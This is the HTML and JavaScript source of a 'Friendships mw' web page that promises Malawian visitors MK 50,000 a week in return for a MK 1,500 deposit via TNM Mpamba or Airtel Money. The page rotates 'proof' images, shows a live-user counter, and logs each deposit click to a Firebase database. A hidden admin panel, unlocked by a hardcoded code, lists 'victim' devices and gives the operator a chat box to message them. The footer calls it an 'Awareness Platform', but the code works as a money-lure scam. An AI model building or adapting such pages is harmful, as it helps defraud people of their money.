<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Friendships mw | Secure Earnings</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

    <meta property="og:title" content="Friendships mw | Earn Weekly">
    <meta property="og:description" content="Register now with MK 1,500 and join the elite earners in Malawi.">
    <meta property="og:image" content="https://dizzar-mw.github.io/EasyMoney/ad.png">
    <link rel="icon" type="image/png" href="favicon.png">

    <style>
        :root { --wa-green: #075E54; --wa-light: #25D366; --bg: #f0f2f5; --text: #333; --card: #ffffff; }
        .dark-theme { --bg: #111b21; --text: #e9edef; --card: #222e35; --wa-green: #202c33; }
        
        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: var(--bg); color: var(--text); transition: 0.3s; }
        nav { background: var(--wa-green); color: white; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
        
        .online-badge { background: #ff3b30; color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold; }
        .dropbtn { background: #128c7e; border: none; color: white; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .dropdown-content { display: none; position: absolute; right: 20px; top: 55px; background: var(--card); min-width: 180px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); border-radius: 8px; z-index: 1001; }
        .dropdown-content button { width: 100%; border: none; padding: 12px; background: none; color: var(--text); text-align: left; cursor: pointer; border-bottom: 1px solid #4444; }

        .container { max-width: 450px; margin: 20px auto; padding: 15px; }
        .card { background: var(--card); border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; margin-bottom: 20px; }
        
        /* 3D Flip */
        .flip-container { perspective: 1000px; width: 100%; height: 230px; margin: 0 auto 15px; }
        .flipper { width: 100%; height: 100%; transition: 0.8s; transform-style: preserve-3d; position: relative; }
        .do-flip { transform: rotateY(180deg); }
        .front, .back { width: 100%; height: 100%; backface-visibility: hidden; position: absolute; top: 0; left: 0; border-radius: 10px; overflow: hidden; border: 1px solid #ddd; }
        .back { transform: rotateY(180deg);} 
        .proof-img { width: 100%; height: 100%; object-fit: contain; background: #000; }

        /* Deposit Buttons */
        .btn-mpamba { background: #25D366; color: white; padding: 15px; width: 100%; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 10px; }
        .btn-airtel { background: #FF0000; color: white; padding: 15px; width: 100%; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 5px; }

        /* Admin Side Chat */
        #admin-side { display: none; text-align: left; }
        .chat-window { background: #e5ddd5; border-radius: 8px; height: 300px; overflow-y: auto; padding: 15px; border: 1px solid #ccc; font-size: 13px; color: black; display: flex; flex-direction: column; }
        .msg { background: white; padding: 8px; border-radius: 5px; margin-bottom: 8px; max-width: 85%; box-shadow: 1px 1px 1px rgba(0,0,0,0.1); }
        .msg-admin { background: #dcf8c6; align-self: flex-end; }
        
        footer { text-align: center; padding: 20px; font-size: 11px; opacity: 0.6; }
    </style>
</head>
<body>

<nav>
    <strong>Friendships mw <span id="online-count" class="online-badge">0 Live</span></strong>
    <div class="dropdown">
        <button class="dropbtn" onclick="toggleMenu()">Menu â–¾</button>
        <div id="dropdownContent" class="dropdown-content">
            <button onclick="toggleLang()" id="langBtn">Chichewa Version</button>
            <button onclick="toggleTheme()" id="themeBtn">Dark Mode</button>
            <button onclick="enterAdmin()">Admin Sign-In</button>
        </div>
    </div>
</nav>

<div class="container" id="user-side">
    <div class="card">
        <div class="flip-container">
            <div class="flipper" id="main-flipper">
                <div class="front"><img src="ad.png" class="proof-img"></div>
                <div class="back"><img id="back-img" src="" class="proof-img"></div>
            </div>
        </div>

        <h2 id="hero-h">Earn MK 50,000 Weekly!</h2>
        <p id="hero-p" style="font-size:14px;">Deposit MK 1,500 to activate your wallet.</p>
        
        <button class="btn-mpamba" onclick="logAction('Mpamba Deposit Clicked')">Deposit via TNM Mpamba</button>
        <button class="btn-airtel" onclick="logAction('Airtel Deposit Clicked')">Deposit via Airtel Money</button>
        
        <p style="font-size: 11px; margin-top: 15px;"> sponsored by EasyMoney Limited Mw. @ admin</p>
    </div>
</div>

<div class="container" id="admin-side">
    <div class="card" style="border: 2px solid #ff4d4d;">
        <h3 style="color:#ff4d4d; margin-top:0;">MADOLO ADMIN</h3>
        <div id="victim-list" style="font-size: 11px; background: #eee; padding: 8px; border-radius: 5px; margin-bottom: 10px; max-height: 60px; overflow-y: auto;">
            Scanning for IP...
        </div>
        <div class="chat-window" id="chat-window"></div>
        <div style="display:flex; margin-top:10px;">
            <input type="text" id="admin-input" placeholder="Text victim..." style="flex:1; padding:10px;">
            <button onclick="sendAdminMsg()" style="padding:10px; background:var(--wa-green); color:white; border:none;">Send</button>
        </div>
        <button onclick="location.reload()" style="width:100%; margin-top:10px; padding:5px; border:none; background:#ccc;">Logout</button>
    </div>
</div>

<footer>&copy; 2026 Awareness Platform</footer>

<script>
    // --- 1. FIREBASE CONFIG (Your Real Keys) ---
    const firebaseConfig = {
        apiKey: "AIzaSyDGMaQZ196VVBWIWxO_5sgDFjvH3OU8Bkc",
        authDomain: "easymoney-f824b.firebaseapp.com",
        databaseURL: "https://easymoney-f824b-default-rtdb.firebaseio.com",
        projectId: "easymoney-f824b",
        storageBucket: "easymoney-f824b.firebasestorage.app",
        messagingSenderId: "589780919277",
        appId: "1:589780919277:web:de9049822ec64c7eaa3de4"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // --- 2. GITHUB API (For Proof Folder) ---
    const repoOwner = "dizzar-mw";
    const repoName = "EasyMoney";
    const folderPath = "flip%20Image";
    let proofPhotos = [];
    let proofIdx = 0;

    async function fetchImages() {
        try {
            const res = await fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${folderPath}`);
            const data = await res.json();
            proofPhotos = data.filter(f => f.name.match(/\.(jpe?g|png)$/i)).map(f => f.download_url);
            if(proofPhotos.length > 0) {
                document.getElementById('back-img').src = proofPhotos[0];
                startFlip();
            }
        } catch (e) { document.getElementById('back-img').src = "ad.png"; }
    }

    function startFlip() {
        setInterval(() => {
            const f = document.getElementById('main-flipper');
            f.classList.toggle('do-flip');
            if(f.classList.contains('do-flip')) {
                proofIdx = (proofIdx + 1) % proofPhotos.length;
                setTimeout(() => { document.getElementById('back-img').src = proofPhotos[proofIdx]; }, 400);
            }
        }, 5000);
    }

    // --- 3. LIVE TRACKING & CHAT ---
    const deviceId = localStorage.getItem('did') || 'V-'+Math.floor(Math.random()*9000);
    localStorage.setItem('did', deviceId);

    // Track Online Presence
    const myPresenceRef = db.ref('presence/' + deviceId);
    myPresenceRef.set({ status: "online", last: Date.now() });
    myPresenceRef.onDisconnect().remove();

    db.ref('presence').on('value', snap => {
        document.getElementById('online-count').innerText = snap.numChildren() + " Live";
        let list = "";
        snap.forEach(u => { list += `Device: ${u.key} (Online)<br>`; });
        document.getElementById('victim-list').innerHTML = list;
    });

    // Logging & Chat
    function logAction(act) {
        db.ref('chat').push({ sender: deviceId, text: act, time: Date.now() });
        alert("Verification in progress. Please wait 5 minutes.");
    }

    function sendAdminMsg() {
        const val = document.getElementById('admin-input').value;
        if(!val) return;
        db.ref('chat').push({ sender: "Admin", text: val, time: Date.now() });
        document.getElementById('admin-input').value = "";
    }

    db.ref('chat').limitToLast(15).on('value', snap => {
        const win = document.getElementById('chat-window');
        win.innerHTML = "";
        snap.forEach(m => {
            const data = m.val();
            const cls = data.sender === "Admin" ? "msg msg-admin" : "msg";
            win.innerHTML += `<div class="${cls}"><b>${data.sender}:</b> ${data.text}</div>`;
        });
        win.scrollTop = win.scrollHeight;
    });

    // --- 4. UI UTILITIES ---
    function toggleMenu() { document.getElementById("dropdownContent").style.display = (document.getElementById("dropdownContent").style.display === "block") ? "none" : "block"; }
    function toggleTheme() { document.body.classList.toggle("dark-theme"); }
    function toggleLang() {
        isChi = !isChi;
        document.getElementById("hero-h").innerText = isChi ? "Pezani MK 50,000 Sabata Iliyonse!" : "Earn MK 50,000 Weekly!";
    }
    let isChi = false;
    function enterAdmin() {
        if (prompt("Security Code:") === "madolo") {
            document.getElementById("user-side").style.display = "none";
            document.getElementById("admin-side").style.display = "block";
        }
    }

    window.onload = fetchImages;
</script>
</body>
</html>
